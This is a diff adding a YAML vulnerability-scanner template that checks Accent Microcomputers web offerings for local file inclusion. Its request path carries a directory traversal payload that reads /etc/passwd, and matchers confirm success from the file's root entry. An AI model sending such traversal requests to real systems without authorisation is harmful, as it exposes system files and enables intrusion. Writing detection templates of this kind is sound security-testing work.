@@ -1,0 +1,23 @@
+id: accent-microcomputers-lfi
+name: Accent Microcomputers LFI
+severity: high
+confidence: tentative
+description: A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve
+  password files.
+reference: CWE-22
+tags:
+- microcomputers
+- accent
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /index.php?id=50&file=../../../../../../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - root:[x*]:0:0
+  - type: status
+    status:
+    - 200
+  condition: and
